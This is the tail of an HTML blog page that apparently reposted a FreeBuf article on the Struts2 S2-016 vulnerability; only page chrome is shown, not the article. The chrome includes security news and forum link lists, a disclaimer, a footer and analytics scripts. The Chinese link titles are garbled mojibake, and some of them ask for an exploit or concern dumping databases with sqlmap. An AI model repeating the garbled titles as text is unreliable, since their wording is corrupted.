<li><a href="http://www.freebuf.com/news/others/11063.html" title="æœ‰æ‰ï¼ç½‘å‹åˆ¶ä½œçš„Freebufå£çº¸ï¼ˆæ›´æ–°ï¼‰" target="_blank">æœ‰æ‰ï¼ç½‘å‹åˆ¶ä½œçš„Freebufå£çº¸ï¼ˆæ›´æ–°ï¼‰</a></li>
<li><a href="http://www.freebuf.com/news/11259.html" title="è‹±å›½æ”¿åºœå°†è°ƒæŸ¥åä¸ºåœ¨è‹±ç½‘ç»œå®‰å…¨ä¸­å¿ƒ" target="_blank">è‹±å›½æ”¿åºœå°†è°ƒæŸ¥åä¸ºåœ¨è‹±ç½‘ç»œå®‰å…¨ä¸­å¿ƒ</a></li>
<li><a href="http://www.freebuf.com/news/11258.html" title="HITCON2013å°æ¹¾é»‘å®¢å¹´ä¼šï¼Œæ·±å…¥è§£æç½‘ç»œå†›äº‹è¡ŒåŠ¨è‡´å‘½ç¯èŠ‚" target="_blank">HITCON2013å°æ¹¾é»‘å®¢å¹´ä¼šï¼Œæ·±å…¥è§£æç½‘ç»œå†›äº‹è¡ŒåŠ¨è‡´å‘½ç¯èŠ‚</a></li>
<li><p><a href="http://www.freebuf.com/news/11181.html" title="Facebookçš„æ¼æ´å¯ä»¥è®©æ”»å‡»è€…åœ¨åˆ†åˆ†é’Ÿå†…é‡ç½®ç”¨æˆ·è´¦æˆ·å¯†ç " target="_blank">Facebookçš„æ¼æ´å¯ä»¥è®©æ”»å‡»è€…åœ¨åˆ†åˆ†é’Ÿå†…é‡ç½®ç”¨æˆ·è´¦æˆ·å¯†ç </a></p>
<h3 id="-club-new-posts-"><strong>ç¤¾åŒºæ–°å¸–**</strong>Club New Posts**</h3>
</li>
<li><p><a href="http://club.freebuf.com/?/question/403" title="zarpæ€ä¹ˆè¿è¡Œï¼Ÿè°¢è°¢æŒ‡æ•™ï¼" target="_blank">zarpæ€ä¹ˆè¿è¡Œï¼Ÿè°¢è°¢æŒ‡æ•™ï¼</a></p>
</li>
<li><a href="http://club.freebuf.com/?/question/402" title="æœŸå¾…FBæ‰“åŒ…hitcon 2013 PPT,è®©buferä»¬ä¹Ÿå­¦ä¹ ä¸‹" target="_blank">æœŸå¾…FBæ‰“åŒ…hitcon 2013 PPT,è®©buferä»¬ä¹Ÿå­¦ä¹ ä¸‹</a></li>
<li><a href="http://club.freebuf.com/?/question/401" title="å¼±å¼±çš„é—®ä¸€å“ˆï¼Œå’±ä»¬è¿™æœ‰æœ¨æœ‰ä¼é¹…group" target="_blank">å¼±å¼±çš„é—®ä¸€å“ˆï¼Œå’±ä»¬è¿™æœ‰æœ¨æœ‰ä¼é¹…group</a></li>
<li><a href="http://club.freebuf.com/?/question/400" title="æ±‚ä¸ªEPATHOBJ çš„EXPï¼Œèƒ½æ‰“64ä½ç³»ç»Ÿçš„" target="_blank">æ±‚ä¸ªEPATHOBJ çš„EXPï¼Œèƒ½æ‰“64ä½ç³»ç»Ÿçš„</a></li>
<li><a href="http://club.freebuf.com/?/question/399" title=" ä½¿ç”¨sqlmap dumpæ•°æ®åº“çš„é—®é¢˜" target="_blank">ä½¿ç”¨sqlmap dumpæ•°æ®åº“çš„é—®é¢˜</a></li>
<li><a href="http://club.freebuf.com/?/question/398" title="èƒ½è®¿é—®80ç«¯å£å…¶ä»–éƒ½ä¸èƒ½å¤Ÿï¼Œpingä¹Ÿä¸è¡Œ" target="_blank">èƒ½è®¿é—®80ç«¯å£å…¶ä»–éƒ½ä¸èƒ½å¤Ÿï¼Œpingä¹Ÿä¸è¡Œ</a></li>
<li><a href="http://club.freebuf.com/?/question/397" title="WiFiPineAppleèµ„æº[é•¿æœŸæ›´æ–°]" target="_blank">WiFiPineAppleèµ„æº[é•¿æœŸæ›´æ–°]</a></li>
<li><a href="http://club.freebuf.com/?/question/396" title="[å·²æ›´æ–°]FREEBUFæ¡Œé¢ä¸¤å¼ é™„å¸¦psd" target="_blank">[å·²æ›´æ–°]FREEBUFæ¡Œé¢ä¸¤å¼ é™„å¸¦psd</a></li>
<li><a href="http://club.freebuf.com/?/question/395" title="FREEBUFæ¡Œé¢èƒŒæ™¯å›¾ç‰‡[é«˜æ¸…]" target="_blank">FREEBUFæ¡Œé¢èƒŒæ™¯å›¾ç‰‡[é«˜æ¸…]</a></li>
<li><a href="http://club.freebuf.com/?/question/394" title="æ±‚åŠ©//sqlmapæ±‰å­—é—®é¢˜" target="_blank">æ±‚åŠ©//sqlmapæ±‰å­—é—®é¢˜</a></li>
</ul>
<p><img src="" alt=""> å¾®ä¿¡æ‰«æä¸Šå›¾è®¢é˜…freebufï¼Œæ¯æ—¥ç²¾åæ–‡ç« æ¨é€ã€‚
All of the material and the informations available on freebuf. com is for informative purpose. freebuf.com declines all responsibilities from the damage that may be done of it, consequently it does not encourage who might use it for illegal purposes.</p>
<h3 id="freebuf-com">FREEBUF.COM</h3>
<p><a href="http://www.freebuf.com/dis" target="_blank">å…è´£å£°æ˜</a> <a href="http://www.freebuf.com/friends" target="_blank">å‹æƒ…é“¾æ¥</a> <a href="http://www.freebuf.com/newsend" target="_blank">æˆ‘è¦æŠ•ç¨¿</a>
<a href="http://www.freebuf.com/others/864.html" target="_blank">å…³äºæˆ‘ä»¬</a> <a href="http://www.freebuf.com/partner" target="_blank">åˆä½œä¼™ä¼´</a> <a href="http://www.freebuf.com/contact" target="_blank">è”ç³»æˆ‘ä»¬</a></p>
<p>Copyright @ 2012 WWW.FREEBUF.COM All Rights Reserved
<a href=""></a> <a href="&quot;previous&quot;"></a><a href="&quot;next&quot;"></a></p>
<p>prev
next</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/struts&Java/">struts&Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/struts&Java/" class="label label-primary">struts&Java</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/91/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/89/">89</a></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li class="active"><li><span class="page-number current">92</span></li><li><a class="page-number" href="/page/93/">93</a></li><li><a class="page-number" href="/page/94/">94</a></li><li><a class="page-number" href="/page/95/">95</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/93/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">æœ€è¿‘æ›´æ–°</div>  <div data-src='latest_update_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> æ›´æ–°æ—¶é—´: <em>2014-03-15 15:12:18</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
